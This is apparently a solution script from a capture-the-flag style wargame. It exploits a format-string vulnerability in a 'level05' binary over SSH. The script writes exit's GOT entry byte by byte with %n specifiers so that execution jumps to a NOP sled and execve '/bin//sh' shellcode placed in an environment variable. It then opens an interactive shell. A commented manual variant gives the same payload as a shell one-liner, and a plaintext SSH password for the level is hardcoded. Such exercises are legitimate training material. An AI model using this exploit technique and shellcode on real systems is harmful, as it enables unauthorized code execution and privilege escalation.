from pwn import *

### INFORMATIONS ###

# Need 9 jumpers before reaching beginning of format string
# %10$p --> points to beginning of format string
# exit .plt.got @ 0x80497e0
# env var @ 0xffffdda6 in GDB - taking 0xffffde6e to land in NOP sled


### AUTOMATIC EXPLOIT

def calculate_padding(bytes_written, desired_byte) :
    desired_byte += 0x100
    bytes_written %= 0x100
    padding = (desired_byte - bytes_written) % 0x100
    if (padding < 10) :
        padding += 0x100
    return padding

s = ssh(host='192.168.1.3', port=4242, user="level05", password="3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN")
p = s.process(["/home/users/level05/./level05"], env={"PWN": b'\x90' * 500 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'})


waddr = b'\xe0\x97\x04\x08\x11\x11\x11\x11\xe1\x97\x04\x08\x22\x22\x22\x22\xe2\x97\x04\x08\x33\x33\x33\x33\xe3\x97\x04\x08'
bytes_written = 0x1c

payload = b''
payload += waddr

first_byte_padding = calculate_padding(bytes_written, 0x6e)
payload += b"%0" + (str(first_byte_padding)).encode() + b"u%10$n"
bytes_written += first_byte_padding

second_byte_padding = calculate_padding(bytes_written, 0xde)
payload += b"%0" + (str(second_byte_padding)).encode() + b"u%12$n"
bytes_written += second_byte_padding

third_byte_padding = calculate_padding(bytes_written, 0xff)
payload += b"%0" + (str(third_byte_padding)).encode() + b"u%14$n"
bytes_written += third_byte_padding

fourth_byte_padding = calculate_padding(bytes_written, 0xff)
payload += b"%0" + (str(fourth_byte_padding)).encode() + b"u%16$n"
bytes_written += fourth_byte_padding

payload += b'a' * (100 - len(payload))

p.sendline(payload)
p.interactive()





### MANUAL EXPLOIT ###

# >>> Generate the above payload in file
#file = open("payload", "wb")
#file.write(payload)
#file.close()

# >>> Transfer file on target

# >>> Execute this command
# cat /tmp/payload - | env -i PWN=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./level05


